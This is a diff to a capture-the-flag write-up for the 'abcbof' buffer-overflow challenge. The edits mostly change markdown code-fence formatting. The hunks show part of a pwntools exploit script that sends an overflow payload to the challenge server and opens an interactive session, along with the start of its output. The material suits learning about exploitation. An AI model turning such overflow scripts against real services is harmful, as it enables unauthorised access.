@@ -12,7 +12,7 @@ nc chals20.cybercastors.com 14424
 
 Open the binary with Ghidra and look at `main()`. This one is really simple.
 
-```
+```c
 undefined8 main(void)
 
 {
@@ -46,8 +46,7 @@ Hello everyone, say your name: hello
 
 Now write up a script to get the real flag from the remote server.
 
-```
-root@kali:~/Downloads# cat abcbof-exploit.py 
+```python
 #!/usr/bin/env python3
 from pwn import *
 p = remote('chals20.cybercastors.com', 14424)
@@ -56,6 +55,9 @@ payload += b'CyberCastors'
 p.recvuntil('say your name:')
 p.sendline(payload)
 p.interactive()
+```
+
+```
 root@kali:~/Downloads# ./abcbof-exploit.py 
 [+] Opening connection to chals20.cybercastors.com on port 14424: Done
 [*] Switching to interactive mode
